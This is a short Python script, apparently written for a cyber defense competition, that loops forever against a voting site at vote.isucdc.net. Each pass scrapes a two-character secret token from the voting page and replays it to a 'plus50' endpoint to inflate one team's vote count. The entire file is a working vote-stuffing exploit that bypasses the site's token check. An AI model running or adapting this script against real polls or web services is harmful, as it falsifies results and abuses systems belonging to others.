import requests
from multiprocessing import Pool

pool = Pool(8)

def vote(team):
    while True:
        page = requests.get('http://vote.isucdc.net/Team4/votefor').content
        s = page.find('?secret=')
        secret = page[s+8:s+10].replace('"', '')
        requests.get('http://vote.isucdc.net/Team4/plus50?secret=%s' % secret)
        print secret

if __name__ ==  '__main__':
    vote(9)

